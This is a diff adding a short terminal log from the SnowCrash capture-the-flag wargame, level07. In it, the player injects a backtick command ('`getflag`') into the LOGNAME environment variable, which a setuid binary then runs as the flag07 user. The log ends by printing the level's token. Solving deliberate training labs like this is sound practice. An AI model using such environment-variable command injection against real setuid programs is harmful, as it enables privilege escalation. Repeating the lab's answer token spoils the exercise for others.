@@ -1,0 +1,14 @@
+< level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
+# now we see if the LOGNAME env variable is as we want it
+< level07@SnowCrash:~$ env
+> SHELL=/bin/bash
+<> [...]
+> SHLVL=2
+> LOGNAME=`getflag`
+> SSH_CONNECTION=192.168.1.85 49954 192.168.1.83 4242
+> LESSOPEN=| /usr/bin/lesspipe %s
+> LESSCLOSE=/usr/bin/lesspipe %s %s
+> _=/usr/bin/env
+# and since it prints the value of logname, it should print the result of getflag, running as flag07
+< level07@SnowCrash:~$ ./level07
+> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
